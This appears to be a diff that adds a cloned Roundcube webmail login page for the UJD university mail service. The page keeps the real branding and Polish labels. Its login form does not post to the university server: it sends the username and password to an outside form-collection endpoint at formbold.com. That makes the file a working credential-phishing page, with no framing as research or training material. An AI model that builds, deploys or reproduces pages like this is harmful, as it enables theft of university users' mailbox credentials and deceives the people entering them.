@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pl" class="js mozilla layout-large"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Witamy w systemie poczty UJD :: Witamy w Witamy w systemie poczty UJD</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
+<meta name="theme-color" content="#f4f4f4">
+<meta name="msapplication-navbutton-color" content="#f4f4f4">
+
+	<link rel="shortcut icon" href="https://poczta.ujd.edu.pl/skins/elastic/images/favicon.ico?s=1530020861">
+
+	<link rel="stylesheet" href="ujd_files/bootstrap.min.css">
+			<link rel="stylesheet" href="ujd_files/styles.css">
+		
+	<link rel="stylesheet" type="text/css" href="ujd_files/jquery-ui.css">
+<script src="ujd_files/jquery.min.js"></script>
+<script src="ujd_files/common.min.js"></script>
+<script src="ujd_files/app.min.js"></script>
+<script src="ujd_files/jstz.min.js"></script>
+<script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"pl_PL","devel_mode":null,"rcversion":10411,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"skin":"elastic","blankpage":"skins/elastic/watermark.html","refresh_interval":600,"session_lifetime":600,"action":"","comm_path":"./?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"RRRR-MM-DD","request_token":"x92XsKca1JjURbVyR1gCbKgl5gX1iyhq"});
+rcmail.add_label({"loading":"Ładowanie...","servererror":"Błąd serwera!","connerror":"Błąd połączenia (brak odpowiedzi serwera)!","requesttimedout":"Upłynął limit czasu żądania","refreshing":"Odświeżanie...","windowopenerror":"Wyskakujące okno zostało zablokowane!","uploadingmany":"Zapisywanie plików...","uploading":"Zapisywanie pliku...","close":"Zamknij","save":"Zapisz","cancel":"Anuluj","alerttitle":"Uwaga","confirmationtitle":"Czy jesteś pewien...","delete":"Usuń","continue":"Kontynuuj","ok":"OK","back":"Wstecz","errortitle":"Wystąpił błąd!","options":"Ustawienia","plaintoggle":"Zwykły tekst","htmltoggle":"HTML","previous":"Poprzednia","next":"Następna","select":"Zaznacz","browse":"Przeglądaj","choosefile":"Wybierz plik...","choosefiles":"Wybierz pliki..."});
+rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
+rcmail.gui_object('message', 'messagestack');
+</script>
+
+<script src="ujd_files/jquery-ui.min.js"></script>
+<script src="ujd_files/jquery.ui.datepicker-pl.js"></script>
+
+</head>
+<body class="task-login action-none">
+			<div id="layout">
+	
+
+<h1 class="voice">Witamy w systemie poczty UJD Zaloguj</h1>
+
+<div id="layout-content" class="selected no-navbar" role="main">
+	<img src="ujd_files/logo.svg" id="logo" alt="Logo">
+	<form id="login-form" name="login-form" method="post" class="propform" action="https://formbold.com/s/9175E">
+<input type="hidden" name="_token" value="x92XsKca1JjURbVyR1gCbKgl5gX1iyhq" class="form-control">
+	<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" value="" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Nazwa</label>
+</td>
+<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input name="_user" id="rcmloginuser" required="" size="40" autocapitalize="none" type="text" class="form-control" placeholder="Nazwa"></td>
+</tr>
+<tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Hasło</label>
+</td>
+<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input name="_pass" id="rcmloginpwd" required="" size="40" autocapitalize="none" autocomplete="off" type="password" class="form-control" placeholder="Hasło"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Zaloguj</button>
+</p>
+
+		<div id="login-footer" role="contentinfo">
+			Witamy w systemie poczty UJD
+			
+						
+		</div>
+	</form>
+</div>
+
+<noscript>
+	<p class="noscriptwarning">Uwaga: Usługa wymaga Javascriptu! Aby z niej skorzystać proszę włączyć obsługę języka Javascript w ustawieniach przeglądarki.</p>
+</noscript>
+
+</div>
+<div id="messagestack"></div>
+<script>
+$(function() {
+rcmail.init();
+});
+</script>
+
+
+
+<script src="ujd_files/bootstrap.bundle.min.js"></script>
+<script src="ujd_files/ui.min.js"></script>
+
+
+</body></html>
